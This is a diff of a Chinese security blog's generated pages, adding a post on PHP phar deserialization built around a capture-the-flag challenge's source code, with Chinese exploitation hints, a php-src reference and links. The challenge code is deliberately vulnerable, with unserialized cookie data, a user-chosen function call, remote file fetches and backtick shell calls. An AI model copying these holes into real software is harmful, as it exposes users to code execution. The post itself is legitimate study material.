+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$FLAG = create_function(<span class="string">""</span>, <span class="string">'die(`/read_flag`);'</span>);</span><br><span class="line">$SECRET = `/read_secret`;</span><br><span class="line">$SANDBOX = <span class="string">"/var/www/data/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123;</span><br><span class="line">	$data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">	$hmac = hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET);</span><br><span class="line">	setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $avatar;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;avatar = $path;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 猜测执行 FLAG() 出 flag</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line">		<span class="keyword">eval</span>(<span class="string">"function my_function_$random() &#123;"</span></span><br><span class="line">			. <span class="string">"  global \$FLAG; \$FLAG();"</span></span><br><span class="line">			. <span class="string">"&#125;"</span>);</span><br><span class="line">		<span class="comment">// 难道要爆破？</span></span><br><span class="line">		$_GET[<span class="string">"lucky"</span>]();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $SECRET;</span><br><span class="line">	$data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line">	<span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac)) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 反序列化点，但无法更改 session 的值</span></span><br><span class="line">	$data = unserialize($data);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">isset</span>($data-&gt;avatar)) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> $data-&gt;avatar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// vps 准备好 phar 文件</span></span><br><span class="line">	$data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);</span><br><span class="line">	<span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// 这两个函数都将造成反序列化</span></span><br><span class="line">	<span class="keyword">if</span> (!file_exists($path . <span class="string">"/avatar.gif"</span>)) &#123;</span><br><span class="line">		$path = <span class="string">"/var/www/html"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	header(<span class="string">"Content-Type: image/gif"</span>);</span><br><span class="line">	<span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">"m"</span>];</span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">"upload"</span>) &#123;</span><br><span class="line">	upload(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>) &#123;</span><br><span class="line">	show(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>来看一下源码  <a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618" target="_blank" rel="noopener">php-src/ext/phar/phar.c:618</a>，调用了 <code>php_var_unserialize</code>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!php_var_unserialize(metadata, &amp;p, p + zip_metadata_len, &amp;var_hash)) &#123;</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a></p>
+<p><a href="https://blog.szfszf.top/tech/phar协议与反序列化漏洞/" target="_blank" rel="noopener">https://blog.szfszf.top/tech/phar%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+<p><a href="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/11/07/%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Phar/</a></p>
 
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="https://wywwzjj.top">wywwzjj</a>
-            </p><p>原文链接：<a href="https://wywwzjj.top/2019/05/12/命令注入绕过总结/">https://wywwzjj.top/2019/05/12/命令注入绕过总结/</a>
-            </p><p>发表日期：<a href="https://wywwzjj.top/2019/05/12/命令注入绕过总结/">May 12th 2019, 12:49:43 am</a>
-            </p><p>更新日期：<a href="https://wywwzjj.top/2019/05/12/命令注入绕过总结/">May 19th 2019, 1:01:41 am</a>
+            </p><p>原文链接：<a href="https://wywwzjj.top/2019/05/18/phar-与反序列化学习/">https://wywwzjj.top/2019/05/18/phar-与反序列化学习/</a>
+            </p><p>发表日期：<a href="https://wywwzjj.top/2019/05/18/phar-与反序列化学习/">May 18th 2019, 5:45:39 pm</a>
+            </p><p>更新日期：<a href="https://wywwzjj.top/2019/05/18/phar-与反序列化学习/">May 21st 2019, 9:12:45 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -572,16 +477,16 @@ height:50vh;
         <li class="next">
             
                 <div class="nextSlogan">Next Post</div>
-                <a href="/2019/05/17/Redis-未授权访问相关利用/" title="Redis 未授权访问相关利用">
-                    <div class="nextTitle">Redis 未授权访问相关利用</div>
+                <a href="/2019/05/18/SSRF-Tips/" title="SSRF Tips">
+                    <div class="nextTitle">SSRF Tips</div>
                 </a>
             
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/04/07/vulnhub-靶机实战系列-HackInOS/" title="vulnhub 靶机实战系列 HackInOS">
-                    <div class="prevTitle">vulnhub 靶机实战系列 HackInOS</div>
+                <a href="/2019/05/17/Redis-未授权访问相关利用/" title="Redis 未授权访问相关利用">
+                    <div class="prevTitle">Redis 未授权访问相关利用</div>
                 </a>
             
         </li>
@@ -710,7 +615,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#直接执行代码"><span class="toc-number">1.</span> <span class="toc-text">直接执行代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#重定向"><span class="toc-number">2.</span> <span class="toc-text">重定向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#读文件"><span class="toc-number">3.</span> <span class="toc-text">读文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass"><span class="toc-number">4.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#多条命令"><span class="toc-number">4.1.</span> <span class="toc-text">多条命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过-escapeshellcmd"><span class="toc-number">4.2.</span> <span class="toc-text">绕过 escapeshellcmd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#空格"><span class="toc-number">4.3.</span> <span class="toc-text">空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#黑名单绕过"><span class="toc-number">4.4.</span> <span class="toc-text">黑名单绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无回显"><span class="toc-number">4.5.</span> <span class="toc-text">无回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#长度限制"><span class="toc-number">4.6.</span> <span class="toc-text">长度限制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#与普通反序列化利用有什么区别？"><span class="toc-number">1.1.</span> <span class="toc-text">与普通反序列化利用有什么区别？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-是什么？"><span class="toc-number">1.2.</span> <span class="toc-text">phar 是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo"><span class="toc-number">2.</span> <span class="toc-text">Demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#应用场景"><span class="toc-number">3.</span> <span class="toc-text">应用场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原理分析"><span class="toc-number">4.</span> <span class="toc-text">原理分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1184,10 +1089,9 @@ top:50vh;
     
     
     
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 34
+        Total : 35
         </div>
         <!-- search  -->
         
@@ -1203,12 +1107,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/2019/05/21/PHP7-内核学习/">PHP7 内核学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
             <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/SSRF-Tips/">SSRF Tips</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/phar-与反序列化/">phar 与反序列化</a>
+            <span class="archive-post-date">05/18</span><a class="archive-post-title" href="/2019/05/18/phar-与反序列化学习/">phar 与反序列化学习</a>
         </li>
     
     
@@ -1218,7 +1127,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/12</span><a class="archive-post-title" href="/2019/05/12/命令注入绕过总结/">命令注入总结</a>
+            <span class="archive-post-date">05/12</span><a class="archive-post-title" href="/2019/05/12/命令注入总结/">命令注入总结</a>
         </li>
     
     
@@ -1332,12 +1241,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ 1321 棋盘问题[DFS]</a>
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ 3984 迷宫问题[BFS]</a>
         </li>
     
     
@@ -1389,11 +1298,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
     
-        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
-    
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
         <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
     
         <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
     
@@ -1401,11 +1310,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="命令注入"><span class="iconfont-archer">&#xe606;</span>命令注入</span>
     
-        <span class="sidebar-tag-name" data-tags="总结"><span class="iconfont-archer">&#xe606;</span>总结</span>
+        <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
     
         <span class="sidebar-tag-name" data-tags="心得"><span class="iconfont-archer">&#xe606;</span>心得</span>
-    
-        <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
     
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
     
